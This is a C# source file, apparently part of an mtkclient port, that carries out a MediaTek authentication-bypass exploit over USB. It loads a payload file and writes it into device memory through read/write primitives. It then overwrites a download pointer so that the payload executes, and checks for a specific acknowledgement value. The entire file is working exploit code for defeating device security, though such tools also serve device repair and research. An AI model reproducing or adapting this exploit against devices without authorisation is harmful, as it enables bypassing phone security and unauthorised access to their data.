using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace mtkclient.library.xflash
{
    internal class MtkAuthExploitService
    {
        public static async Task ExploitAsync(
            IMtkUsbDevice device,
            MtkChipConfig chipConfig,
            CancellationToken cancellationToken
        )
        {
            if (
                chipConfig.PtrDl.HasValue
                && chipConfig.PayloadAddress.HasValue
                && chipConfig.WdgAddress.HasValue
                && chipConfig.UartAddress.HasValue
                && chipConfig.PayloadFileName != null
            )
            {
                string payloadpath =
                    Application.StartupPath + "\\payloads\\" + chipConfig.PayloadFileName;
                uint value = chipConfig.WdgAddress.Value;
                uint value2 = chipConfig.UartAddress.Value;
                byte[] payload = MtkAuthExploitPayloadService.Prepare(
                    value,
                    value2,
                    File.ReadAllBytes(payloadpath)
                );
                byte[] lineCodeBuff = new byte[7];
                await device.SendControlMessageAsync(
                    161,
                    33,
                    0,
                    0,
                    lineCodeBuff,
                    cancellationToken
                );
                lineCodeBuff = ((IEnumerable<byte>)lineCodeBuff).Append((byte)0).ToArray();
                uint ptrSendAddress = (uint)(
                    BitConverter.ToUInt32(
                        await MtkAuthExploitDaService.ReadAsync(
                            device,
                            chipConfig,
                            lineCodeBuff,
                            chipConfig.PtrDl.Value,
                            4,
                            check: true,
                            cancellationToken
                        ),
                        0
                    ) + 8
                );
                await MtkAuthExploitDaService.WriteAsync(
                    device,
                    chipConfig,
                    lineCodeBuff,
                    chipConfig.PayloadAddress.Value,
                    payload.Length,
                    payload,
                    check: true,
                    cancellationToken
                );

                byte[] bytes = BitConverter.GetBytes(chipConfig.PayloadAddress.Value);
                await MtkAuthExploitDaService.WriteAsync(
                    device,
                    chipConfig,
                    lineCodeBuff,
                    ptrSendAddress,
                    bytes.Length,
                    bytes,
                    check: false,
                    cancellationToken
                );
                Console.WriteLine("Reading ack");
                await Task.Delay(TimeSpan.FromMilliseconds(200.0));
                uint num = await device.ReadDwordAsync(little: true, cancellationToken);
                if (num != 2711790500U)
                {
                    Console.WriteLine($"Invalid ack: 0x{num:X8}");
                }
                return;
            }
            MessageBox.Show(
                "Device Security Is Not Supported... Please Use Other Device!",
                "Info!",
                MessageBoxButtons.OK
            );
            return;
        }
    }
}
